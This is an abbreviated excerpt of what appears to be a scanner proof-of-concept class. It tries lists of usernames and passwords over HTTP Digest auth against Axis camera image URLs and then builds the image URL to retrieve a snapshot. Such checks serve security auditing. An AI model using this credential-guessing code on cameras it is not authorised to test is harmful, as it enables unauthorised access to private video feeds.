...
class AxisWeakPassword(POCTemplate):
    ...
    def verify(self, ip, port=80):
        ...
        for user in _users:
            for password in _passwords:
                try:
                    r = requests.get(url=self._get_url(ip, port, '/jpg/image.jpg'), auth=requests.auth.HTTPDigestAuth(user, password), timeout=self.config.timeout, headers=headers, verify=False, proxies=proxies)
    ...
    def exploit(self, results):
        ...
        url = self._get_url(ip, port, '/jpg/image.jpg')
